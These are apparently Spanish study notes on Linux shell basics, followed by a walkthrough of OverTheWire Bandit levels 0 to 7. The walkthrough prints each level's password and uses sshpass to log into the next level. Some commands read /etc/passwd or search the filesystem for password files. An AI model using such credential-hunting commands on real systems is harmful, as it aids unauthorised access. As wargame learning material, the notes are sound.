drwxr-xr-x k4rma k4rma 174 B Wed Jan  4 13:35:24 2023  Descargas
drwxr-xr-x k4rma k4rma  50 B Tue Jan 17 12:39:22 2023  Desktop
drwxr-xr-x k4rma k4rma  36 B Wed Jan 18 12:06:07 2023  Documentos
drwxr-xr-x k4rma k4rma   0 B Tue Jan  3 20:19:09 2023  HTB
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Imágenes
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Música
drwxr-xr-x k4rma k4rma 496 B Mon Jan  2 12:14:51 2023  powerlevel10k
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Público
drwxr-xr-x k4rma k4rma  22 B Tue Nov 22 21:19:40 2022  Templates
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Vídeos
----------------------------
Para listar archivos ocultos
----------------------------
❯ ls -a
 .            .cache      .icons     .msf4       Desktop      Música          Vídeos          .emacs      .gtkrc-2.0   .viminfo      .xsession-errors       .zshrc
 ..           .config     .kde       .ssh        Documentos   powerlevel10k   .bash_history   .fehbg      .lesshst     .vimrc        .xsession-errors.old   .zshrc~
 .azure       .dbeaver4   .local     .themes     HTB          Público         .bashrc         .fzf.bash   .p10k.zsh    .wget-hsts    .zcompdump
 .BurpSuite   .fzf        .mozilla   Descargas   Imágenes     Templates       .dmrc           .fzf.zsh    .profile     .Xauthority   .zsh_history
-------------------------
creamos un archivo oculto
-------------------------
❯ mkdir .prueba
❯ ls -l
drwxr-xr-x k4rma k4rma 174 B Wed Jan  4 13:35:24 2023  Descargas
drwxr-xr-x k4rma k4rma  50 B Tue Jan 17 12:39:22 2023  Desktop
drwxr-xr-x k4rma k4rma  36 B Wed Jan 18 12:06:07 2023  Documentos
drwxr-xr-x k4rma k4rma   0 B Tue Jan  3 20:19:09 2023  HTB
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Imágenes
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Música
drwxr-xr-x k4rma k4rma 496 B Mon Jan  2 12:14:51 2023  powerlevel10k
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Público
drwxr-xr-x k4rma k4rma  22 B Tue Nov 22 21:19:40 2022  Templates
drwxr-xr-x k4rma k4rma   0 B Thu Dec 22 18:07:49 2022  Vídeos
❯ ls -a
 .            .cache      .icons     .msf4     Descargas    Imágenes        Templates       .dmrc       .fzf.zsh     .profile     .Xauthority            .zsh_history
 ..           .config     .kde       .prueba   Desktop      Música          Vídeos          .emacs      .gtkrc-2.0   .viminfo     .xsession-errors       .zshrc
 .azure       .dbeaver4   .local     .ssh      Documentos   powerlevel10k   .bash_history   .fehbg      .lesshst     .vimrc       .xsession-errors.old   .zshrc~
 .BurpSuite   .fzf        .mozilla   .themes   HTB          Público         .bashrc         .fzf.bash   .p10k.zsh    .wget-hsts   .zcompdump
❯ rm -rf .prueba
❯ ls -a
 .            .cache      .icons     .msf4       Desktop      Música          Vídeos          .emacs      .gtkrc-2.0   .viminfo      .xsession-errors       .zshrc
 ..           .config     .kde       .ssh        Documentos   powerlevel10k   .bash_history   .fehbg      .lesshst     .vimrc        .xsession-errors.old   .zshrc~
 .azure       .dbeaver4   .local     .themes     HTB          Público         .bashrc         .fzf.bash   .p10k.zsh    .wget-hsts    .zcompdump
 .BurpSuite   .fzf        .mozilla   Descargas   Imágenes     Templates       .dmrc           .fzf.zsh    .profile     .Xauthority   .zsh_history
❯ cd
❯ echo $SHELL
/usr/bin/zsh
❯ nano .zshrc
❯ ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.234.134  netmask 255.255.255.0  broadcast 192.168.234.255
        inet6 fe80::7702:678d:b462:9228  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:60:2b:51  txqueuelen 1000  (Ethernet)
        RX packets 48817  bytes 64417588 (61.4 MiB)
        RX errors 77  dropped 120  overruns 0  frame 0
        TX packets 10275  bytes 2010025 (1.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3014  bytes 445820 (435.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3014  bytes 445820 (435.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

❯ hostname -I
192.168.234.134
❯ hostname -I | awk '{print $1}' //Printear primera posición
192.168.234.134
❯ hostname -I | awk '{print $2}'  //Printear segunda posisción

❯ hostname -I | awk '{print $3}'  //Printear tercera posición

❯ hostname -I | cut -d ' ' -f 1  //Printear primera posición
192.168.234.134
❯ echo "Tu IP privada es: "
Tu IP privada es:
❯ echo "Tu IP privada es:  $(hostname -I | awk '{print $1}')"
---------------------------------------------------------------
Para abrir fichero o directorio desde otra ubicación más arriba
---------------------------------------------------------------
❯ cd Desktop
❯ nano ~/.zshrc
++++++++++++++++++++
Estando en Nano:

 # Funcion personal para ir probando
  48   │ function vermiip(){
  49   │     echo "Tu IP privada es: $(hostname -I | awk '{print $1}')"
  50   │ }
+++++++++++++++++++

❯ vermiip
Tu IP privada es: 192.168.234.134
```
-  Comandos Find y Locate en Linux: [https://www.hostinger.es/tutoriales/como-usar-comando-find-locate-en-linux/](https://www.hostinger.es/tutoriales/como-usar-comando-find-locate-en-linux/)

*------------------------------------*
  *Uso y configuracion de la Kitty*
 *------------------------------------*
- Overview – Kitty: [https://sw.kovidgoyal.net/kitty/overview/](https://sw.kovidgoyal.net/kitty/overview/)

*------------------------*
  *Uso del editor Vim*
*------------------------*
-  Vim Cheat Sheet: [https://vim.rtorr.com/](https://vim.rtorr.com/)

*------------------------*
  *Scripting de Bash*
*------------------------*
```linux
❯ touch script.sh
❯ ls -l
drwxr-xr-x k4rma k4rma    30 B  Tue Jan 17 10:41:02 2023  k4rma
drwxrwx--- root  ALumnos  12 B  Wed Jan 18 11:05:28 2023  prueba
.rwxr-xr-x k4rma k4rma   2.0 KB Mon May  2 18:22:50 2022  README.license
.rw-r--r-- k4rma k4rma     0 B  Fri Jan 20 19:18:01 2023  script.sh
❯ chmod +x script.sh
❯ nvim script.sh

************************************
#!/bin/bash
echo "HOla esto es una prueba"
***********************************
❯ ./script.sh
HOla esto es una prueba

❯ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:60:2b:51 brd ff:ff:ff:ff:ff:ff
    altname enp2s1
    inet 192.168.234.134/24 brd 192.168.234.255 scope global dynamic noprefixroute ens33
       valid_lft 1189sec preferred_lft 1189sec
    inet6 fe80::7702:678d:b462:9228/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
❯ ip a | grep ens33
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
    inet 192.168.234.134/24 brd 192.168.234.255 scope global dynamic noprefixroute ens33
❯ ip a | grep ens33 | tail -n1
    inet 192.168.234.134/24 brd 192.168.234.255 scope global dynamic noprefixroute ens33
❯ ip a | grep ens33 | awk 'NR==2'
    inet 192.168.234.134/24 brd 192.168.234.255 scope global dynamic noprefixroute ens33

// Para recoger los diferentes argumentos; //
❯ ip a | grep ens33 | tail -n1 | awk '{print $1}'
inet
❯ ip a | grep ens33 | tail -n1 | awk '{print $2}'
192.168.234.134/24
❯ ip a | grep ens33 | tail -n1 | awk '{print $3}'
brd
❯ ip a | grep ens33 | tail -n1 | awk '{print $4}'
192.168.234.255

❯ ip a | grep ens33 | tail -n1 | awk '{print $2}'
192.168.234.134/24
❯ ip a | grep ens33 | tail -n1 | awk '{print $2}' | awk '{print $1}' FS="/"
192.168.234.134
❯ ip a | grep ens33 | tail -n1 | awk '{print $2}' | cut -d  '/' -f 1
192.168.234.134
❯ ip a | grep ens33 | tail -n1 | awk '{print $2}' | tr '/' ' '
192.168.234.134 24
❯ ip a | grep ens33 | tail -n1 | awk '{print $2}' | tr '/' ' '| awk '{print $1}'
192.168.234.134
❯ ip a | grep ens33 | tail -n1 | awk '{print $2}'
192.168.234.134/24

❯ nvim script.sh

****************************************************
#!/bin/bash
echo "Esto es tu dirección IP privada -> $(ip a | grep ens33 | tail -n1 | awk '{print $2}' | awk '{print $1}' FS="/")"

****************************************************
❯ nvim script.sh
❯ ./script.sh
Esta es tu dirección ip privada -> ❯ 192.168.234.134
❯ nvim script.sh

*****************************************************
#!bin/bash
echo -e "\n Esto es tu direccion IP privada -> $(ip a | grep ens33 | tail -n1 | awk '{print $2}' | awk '{print $1}' FS="/")\n"

*****************************************************
❯ ./script.sh

 Esta es tu dirección ip privada -> ❯ 192.168.234.134
❯ ./script.sh
Esta es tu dirección ip privada -> ❯ 192.168.234.134
❯ nvim script.sh
❯ ./script.sh

 Esta es tu dirección ip privada -> ❯ 192.168.234.134

/* Si le aplicasemos la variable de colores quedaría asi: */
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: script.sh
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/bin/bash
   2   │ #
   3   │ ##Colours
   4   │ greenColour="\e[0;32m\033[1m"
   5   │ endColour="\033[0m\e[0m"
   6   │ redColour="\e[0;31m\033[1m"
   7   │ blueColour="\e[0;34m\033[1m"
   8   │ yellowColour="\e[0;33m\033[1m"
   9   │ purpleColour="\e[0;35m\033[1m"
  10   │ turquoiseColour="\e[0;36m\033[1m"
  11   │ grayColour="\e[0;37m\033[1m"
  12   │
  13   │ echo -e "\n${yellowColour}[+]${endColour}${blueColour}Esta es tu dirección ip privada -> ${endColour}${redColour}$(ip a | grep ens33 | tail -n1 | awk '{print $2}' | awk '{prin
       │ t $1}' FS="/")${endColour}\n"

/* Si le quitamos el permiso de ejecucion no nos deja executar el scripting, pero si escribimos bash delante nos ejecutaria de todos modos.
los privilegios son inamovibles y no funcionaría si fuese un archivo binario*/

```

*---------------------*
   *OVERTHEWIRE*
*---------------------*

*Conexion SSH*
```linux
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
BANDIT - SSH -The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
❯ ping -c 1 bandit.labs.overthewire.org
PING bandit.labs.overthewire.org (13.49.2.50) 56(84) bytes of data.

--- bandit.labs.overthewire.org ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms  //no responde porque puede estar capada//

❯ ping -c 1 bandit.labs.overthewire.org
PING bandit.labs.overthewire.org (13.49.2.50) 56(84) bytes of data.

--- bandit.labs.overthewire.org ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

❯ ssh bandit0@bandit.labs.overthewire.org -p 2220  // nos conectamos por ssh al puerto 2220
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit0@bandit.labs.overthewire.org's password:
******
aqui le metemos la contraseña que es bandit0
******
 Enjoy your stay!

bandit0@bandit:~$  //Ya estamos dentro de la máquina victima
bandit0@bandit:~$ echo $TERM
xterm-kitty
bandit0@bandit:~$ export TERM=xterm  // Tenemos que cambiar a terminal xterm, sino no podremos hacer ctr+l
bandit0@bandit:~$ echo $TERM
xterm

bandit0@bandit:~$ pwd
/home/bandit0
bandit0@bandit:~$ ls
readme
bandit0@bandit:~$ ls -l
total 4
-rw-r----- 1 bandit1 bandit0 33 Jan 11 19:18 readme
bandit0@bandit:~$ cat readme
NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
bandit0@bandit:~$ cat /etc/passwd  //Para ver todos los usuarios de sistema//
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
// Habria un monton, he cortado aqui//

bandit0@bandit:~$ cat /etc/passwd | grep bash  //Aqui sacariamos por pantalla haciendo un grep, que tengan bash
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
bandit0:x:11000:11000:bandit level 0:/home/bandit0:/bin/bash
bandit1:x:11001:11001:bandit level 1:/home/bandit1:/bin/bash
bandit10:x:11010:11010:bandit level 10:/home/bandit10:/bin/bash
bandit11:x:11011:11011:bandit level 11:/home/bandit11:/bin/bash
bandit12:x:11012:11012:bandit level 12:/home/bandit12:/bin/bash
bandit13:x:11013:11013:bandit level 13:/home/bandit13:/bin/bash
bandit14:x:11014:11014:bandit level 14:/home/bandit14:/bin/bash
bandit15:x:11015:11015:bandit level 15:/home/bandit15:/bin/bash
// Habria unos cuantos mas//

bandit0@bandit:~$ pwd
/home/bandit0
bandit0@bandit:~$ cd ..
bandit0@bandit:/home$ ls
bandit0   bandit13  bandit18  bandit22  bandit27      bandit29-git  bandit31-git  bandit6   drifter1   drifter15  drifter6     formulaone1  krypton1  krypton6
bandit1   bandit14  bandit19  bandit23  bandit27-git  bandit3       bandit32      bandit7   drifter10  drifter2   drifter7     formulaone2  krypton2  krypton7
bandit10  bandit15  bandit2   bandit24  bandit28      bandit30      bandit33      bandit8   drifter12  drifter3   drifter8     formulaone3  krypton3  ubuntu
bandit11  bandit16  bandit20  bandit25  bandit28-git  bandit30-git  bandit4       bandit9   drifter13  drifter4   drifter9     formulaone5  krypton4
bandit12  bandit17  bandit21  bandit26  bandit29      bandit31      bandit5       drifter0  drifter14  drifter5   formulaone0  formulaone6  krypton5
bandit0@bandit:/home$ cd bandit1
bandit0@bandit:/home/bandit1$ ls -l
total 4
-rw-r----- 1 bandit2 bandit1 33 Jan 11 19:18 bandit0@bandit:/home/bandit1$ cd
bandit0@bandit:~$ ls
readme
bandit0@bandit:~$ cat readme
NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
bandit0@bandit:~$-
//  Desde otra terminal  //
sshpass -p 'NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL' ssh bandit1@bandit.labs.overthewire.org -p 2220
// Estariamos dentro de Bandit1 //
Enjoy your stay!
```

*Lectura de archivos especiales*
```
------------------------------------------------------------------------------------------------------------
The password for the next level is stored in a file called **-** located in the home directory
------------------------------------------------------------------------------------------------------------
~$bandit1@bandit:~$ cat -   // Para abrir archivos con un - no se puede abrir como los otros //

^C  //Se te queda en escucha, - va precedido de parametros por eso se cuelga
// Tres formas de caterarlo: //
bandit1@bandit:~$ cat /home/bandit1/-
rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

bandit1@bandit:~$ cat ./-
rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

bandit1@bandit:~$ cat $(pwd)/-
rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

bandit1@bandit:~$ grep -r "\w" 2>/dev/null // Toma una expresión regular (\w) de forma recurrente //
-:rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
.bash_logout:# ~/.bash_logout: executed by bash(1) when login shell exits.
.bash_logout:# when leaving the console clear the screen to increase privacy
.bash_logout:if [ "$SHLVL" = 1 ]; then
.bash_logout:    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q

bandit1@bandit:~$ grep -r "\w" 2>/dev/null | tail -n 1  // que sean la primera por la cola
.bashrc:fi

bandit1@bandit:~$ grep -r "\w" 2>/dev/null | head -n 1  // que sean la primera por la cabeza
-:rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

bandit1@bandit:~$ grep -r "\w" 2>/dev/null | head -n 1 | awk '{print $2}' FS=":"  //me quedo con el segundo argumento tomando como delimitador los dos puntos
rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

bandit1@bandit:~$ grep -r "\w" 2>/dev/null | head -n 1 | tr ':' ' ' | awk '{print $2}' // sustituir los : por espacio y quedarme con el segundo argumento
rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

bandit1@bandit:~$ grep -r "\w" 2>/dev/null | head -n 1 | tr ':' ' ' | awk 'NF{print $NF}'  // igual que el anterior pero tomo el ultimo argumento de la linea NF
rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

bandit1@bandit:~$ grep -r "\w" 2>/dev/null | head -n 1 | tr ':' ' ' | rev | awk '{print $1}' | rev  //reverseo tomo el primer argumento y vuelvo a reversear
rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

//Para jugar con bash se podria sacar por pantalla, de modo de aprender://

bandit1@bandit:~$ echo -e "\n[+] La contraseña es $(grep -r "\w" 2>/dev/null | head -n 1 | tr ':' ' ' | rev | awk '{print $1}' | rev)\n"

[+] La contraseña es rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

bandit1@bandit:~$ exit
logout  //finalizamos la sesion en bandit1

❯ sshpass -p 'rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi' ssh bandit2@bandit.labs.overthewire.org -p 2220  // iniciamos la sesión en bandit2 con la contraseña anterior //

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
The password for the next level is stored in a file called spaces in this filename located in the home directory
-----------------------------------------------------------------------------------------------------------------
bandit2@bandit:~$ ls
spaces in this filename
bandit2@bandit:~$ ls -l
total 4
-rw-r----- 1 bandit3 bandit2 33 Jan 11 19:18 spaces in this filename
bandit2@bandit:~$ cat space in this filename
cat: space: No such file or directory
cat: in: No such file or directory
cat: this: No such file or directory
cat: filename: No such file or directory

bandit2@bandit:~$ cat spaces\ in\ this\ filename
aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG

bandit2@bandit:~$ cat "spaces in this filename"
aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG

bandit2@bandit:~$ cat "spaces in this filename"
aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG

bandit2@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.
❯ sshpass -p 'aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG' ssh bandit3@bandit.labs.overthewire.org -p 2220
Enjoy your stay!

```


*Directorios y archivos ocultos*
```
bandit3@bandit:~$ export TERM=xterm
-----------------------------------------------------------------------------------------------------
The password for the next level is stored in a hidden file in the inhere directory.
-----------------------------------------------------------------------------------------------------

bandit3@bandit:~$ ls
inhere
bandit3@bandit:~$ cd inhere/
bandit3@bandit:~/inhere$ ls
bandit3@bandit:~/inhere$ ls -la
total 12
drwxr-xr-x 2 root    root    4096 Jan 11 19:19 .
drwxr-xr-x 3 root    root    4096 Jan 11 19:19 ..
-rw-r----- 1 bandit4 bandit3   33 Jan 11 19:19 .hidden
bandit3@bandit:~/inhere$ file .hidden  // listamos un archivo oculto, asi sabemos el magic number del archivo, asi saber de que naturaleza es //
.hidden: ASCII text

2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe

bandit3@bandit:~$ find . -type f | grep -v bashrc  //me busca y lista todo menos bashrc
./inhere/.hidden
./.bash_logout
./.profile

bandit3@bandit:~$ find . -type f | grep -vE "bashrc|profile|logout"  // para quitar varias cosas//
./inhere/.hidden
bandit3@bandit:~$ find . -type f | grep -vE "bashrc|profile|logout" | xargs cat
2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe

bandit3@bandit:~$ exit  //salimos
logout
Connection to bandit.labs.overthewire.org closed.

sshpass -p '2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe' ssh bandit4@bandit.labs.overthewire.org -p 2220  //nueva sesione bandit4
Enjoy your stay!
```


*Detección de tipo de formato de archivo*

Lista de firmas de archivos: [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
```
bandit4@bandit:~$ TERM=xterm
--------------------------------------------------------------------------------------------------------------------------------------------------------------
The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.
---------------------------------------------------------------------------------------------------------------------------------------------------------------
bandit4@bandit:~$ find .
.
./inhere
./inhere/-file06
./inhere/-file03
./inhere/-file09
./inhere/-file00
./inhere/-file05
./inhere/-file01
./inhere/-file04
./inhere/-file02
./inhere/-file07
./inhere/-file08
./.bash_logout
./.profile
./.bashrc
bandit4@bandit:~$ find . -type f | grep file
./inhere/-file06
./inhere/-file03
./inhere/-file09
./inhere/-file00
./inhere/-file05
./inhere/-file01
./inhere/-file04
./inhere/-file02
./inhere/-file07
./inhere/-file08
./.profile
bandit4@bandit:~$ find . -type f | grep "\file" | xargs file // para sacar de que tipo de archivos se trata por los magic number
./inhere/-file06: data
./inhere/-file03: data
./inhere/-file09: data
./inhere/-file00: data
./inhere/-file05: data
./inhere/-file01: data
./inhere/-file04: data
./inhere/-file02: data
./inhere/-file07: ASCII text
./inhere/-file08: data
./.profile:       ASCII text

bandit4@bandit:~$ cd inhere/
bandit4@bandit:~/inhere$ ls
-file00  -file01  -file02  -file03  -file04  -file05  -file06  -file07  -file08  -file09
bandit4@bandit:~/inhere$ pwd
/home/bandit4/inhere
bandit4@bandit:~/inhere$ cat $(pwd)/-file01
g       ضb~]CgnSkIbandit4@bandit:~/inhere$ // los demas archivos que no son file07 son ilegibles como podemos ver en este //
bandit4@bandit:~/inhere$ cd ..
bandit4@bandit:~$ cat ./inhere/-file07
lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR

bandit4@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.
❯ sshpass -p 'lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR' ssh bandit5@bandit.labs.overthewire.org -p 2220
Enjoy your stay!
```


*Busquedas precisas de archivo*

-  ¿Cómo buscar y encontrar archivos en Linux?: [https://www.ionos.es/digitalguide/servidores/configuracion/comando-linux-find/](https://www.ionos.es/digitalguide/servidores/configuracion/comando-linux-find/)
```
bandit5@bandit:~$ export TERM=xterm
-----------------------------------------------------------------------------------------------------------------
The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:

    human-readable
    1033 bytes in size
    not executable
----------------------------------------------------------------------------------------------------------------------------
bandit5@bandit:~$ find . -type f ! -executable
./inhere/maybehere10/-file2
./inhere/maybehere10/.file2
./inhere/maybehere10/spaces file2
./inhere/maybehere15/-file2
./inhere/maybehere15/.file2
./inhere/maybehere15/spaces file2
// Un monton de ficheros mas ...... //

bandit5@bandit:~$ man find
bandit5@bandit:~$ find . -type f ! -executable -size 1033c
./inhere/maybehere07/.file2
bandit5@bandit:~$ find . -type f ! -executable -size 1033c | xargs file
./inhere/maybehere07/.file2: ASCII text, with very long lines (1000)
bandit5@bandit:~$ find . -type f ! -executable -size 1033c | xargs cat
P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU


bandit5@bandit:~$ find . -type f ! -executable -size 1033c | wc -l
1
bandit5@bandit:~$ find . -type f ! -executable -size 1033c | head -n 1
./inhere/maybehere07/.file2
bandit5@bandit:~$ find . -type f ! -executable -size 1033c | xargs cat | head -n 1
P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
bandit5@bandit:~$ find . -type f ! -executable -size 1033c | xargs cat | xargs
P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
----------------------------------------------------------------------------------------------------------------------------
The password for the next level is stored somewhere on the server and has all of the following properties:

    owned by user bandit7
    owned by group bandit6
    33 bytes in size
-----------------------------------------------------------------------------------------------------------------------------
bandit6@bandit:~$ cd /   //Vamos a la raiz  //
bandit6@bandit:/$ find . -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null
./var/lib/dpkg/info/bandit7.password
bandit6@bandit:/$
bandit6@bandit:/$ find . -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null | xargs cat
z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
bandit6@bandit:/$ exit
logout
Connection to bandit.labs.overthewire.org closed.
❯ sshpass -p 'z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S' ssh bandit7@bandit.labs.overthewire.org -p 2220
Enjoy your stay!
```


*Metodos de Filtrado de datos*

- AWK Cheat Sheet: [https://www.shortcutfoo.com/app/dojos/awk/cheatsheet](https://www.shortcutfoo.com/app/dojos/awk/cheatsheet)

- AWK Cheat Sheet 2: [https://bl831.als.lbl.gov/~gmeigs/scripting_help/awk_cheat_sheet.pdf](https://bl831.als.lbl.gov/~gmeigs/scripting_help/awk_cheat_sheet.pdf)

También te dejo algunos enlaces de interés por si quieres indagar un poco más acerca del uso del comando ‘**cut**‘:

-  Cheat Sheet: Cutting Text with cut: [https://bencane.com/2012/10/22/cheat-sheet-cutting-text-with-cut/](https://bencane.com/2012/10/22/cheat-sheet-cutting-text-with-cut/)
```
bandit7@bandit:~$ export TERM=xterm
bandit7@bandit:~$
------------------------------------------------------------------------------------------
The password for the next level is stored in the file data.txt next to the word millionth
-----------------------------------------------------------------------------------------
bandit7@bandit:~$ cat data.txt

effluent        YoAlGtuLRdVJGQxbDH52mLT2ktqj3A3i
rang    7yySPGNACo5lYvjJ5a2ChST9NCu9mRhS
victualed       vzFCf3Uc6CV5CeJ4M8roQPaZopDGKbT4
buttons u0ZxrpdJ5QVTngmonyOe65zVhuWj7L5E
cohorts 4fQOWpLTw67XD53vZQsdZGIVyzoSPKa7
expeditionary   xvD3GixgbfZ8EVpc5VRljnqlUc6ocata
solicitors      1OIUROyIUSvTP5c1HfSOheSq9tnQOvMD  //Y un monton más de archivos
// Para sacar por pantalla la flag asociada a la palabra millionth  //
bandit7@bandit:~$ cat data.txt | grep "millionth"
millionth           TESKZC0XvTetK0S9xNwm25STk5iWrBvP
bandit7@bandit:~$ cat data.txt | grep "millionth" | awk 'NF{print $NF}' //El awk te cuenta los argumentos
TESKZC0XvTetK0S9xNwm25STk5iWrBvP
bandit7@bandit:~$ cat data.txt | grep "millionth" | awk '{print $2}'
TESKZC0XvTetK0S9xNwm25STk5iWrBvP
bandit7@bandit:~$ cat data.txt | grep "millionth" | cut -d ' ' -f 1  // En el caso del cut no funcionaria , dado que cuenta los espacios
millionth           TESKZC0XvTetK0S9xNwm25STk5iWrBvP
bandit7@bandit:~$ cat data.txt | grep "millionth" | rev | awk '{print $1}' | rev
TESKZC0XvTetK0S9xNwm25STk5iWrBvP
bandit7@bandit:~$ cat data.txt | grep "millionth" | xargs  //con xargs te lo compactaría todo, dando formato //
millionth TESKZC0XvTetK0S9xNwm25STk5iWrBvP
bandit7@bandit:~$ cat data.txt | grep "millionth" | xargs | cut -d ' ' -f 2
TESKZC0XvTetK0S9xNwm25STk5iWrBvP
bandit7@bandit:~$ cat data.txt | grep "millionth" | xargs | tr ' ' '\n' | tail -n 1
TESKZC0XvTetK0S9xNwm25STk5iWrBvP

-----------------------------------------
inciso de como se podría hacer con el cut
-----------------------------------------

❯ cat example
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: example
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ hola                     probando
   2   │
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

❯ cat example | cut -d ' ' -f 1
hola

❯ cat example | cut -d ' ' -f 2


❯ cat example | cut -d ' ' -f 3


❯ cat example | cut -d ' ' -f 4


❯ seq 1 20
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
❯ for i in $(seq 1 20): do :done
for>
❯ for i in $(seq 1 20); do echo "[+] Iteración número $i" ; done
[+] Iteración número 1
[+] Iteración número 2
[+] Iteración número 3
[+] Iteración número 4
[+] Iteración número 5
[+] Iteración número 6
[+] Iteración número 7
[+] Iteración número 8
[+] Iteración número 9
[+] Iteración número 10
[+] Iteración número 11
[+] Iteración número 12
[+] Iteración número 13
[+] Iteración número 14
[+] Iteración número 15
[+] Iteración número 16
[+] Iteración número 17
[+] Iteración número 18
[+] Iteración número 19
[+] Iteración número 20
❯ for i in $(seq 1 20); do echo "[+] Probando con $i:\n"; cat example | cut -d ' ' -f $i ; done
[+] Probando con 1:

hola

[+] Probando con 2:



[+] Probando con 3:



[+] Probando con 4:



[+] Probando con 5:



[+] Probando con 6:



[+] Probando con 7:



[+] Probando con 8:



[+] Probando con 9:



[+] Probando con 10:



[+] Probando con 11:



[+] Probando con 12:



[+] Probando con 13:



[+] Probando con 14:



[+] Probando con 15:



[+] Probando con 16:



[+] Probando con 17:



[+] Probando con 18:



[+] Probando con 19:



